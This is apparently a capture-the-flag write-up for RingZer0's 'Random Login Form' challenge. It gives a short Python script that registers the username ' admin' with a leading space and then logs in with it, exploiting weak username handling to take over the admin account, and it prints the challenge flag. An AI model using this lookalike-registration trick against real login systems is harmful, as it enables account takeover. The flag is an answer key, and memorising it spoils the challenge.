<h1>Random Login Form</h1>
<h3>Description</h3>
<p>http://challenges.ringzer0ctf.com:10171/</p>
<h3>Solution</h3>

```python3
import requests

s = requests.Session()
url = "http://challenges.ringzer0ctf.com:10171/"
data = {"new":" admin","new_password":"1234","submit":"Register"}
res = s.post(url,data=data).text
data = {"username":" admin","password":"1234"}
res = s.post(url,data=data).text
print(res)
```

<h3>Flag</h3>
<pre>
FLAG-0Kg64o8M9gPQfH45583Mc0jc3u
</pre>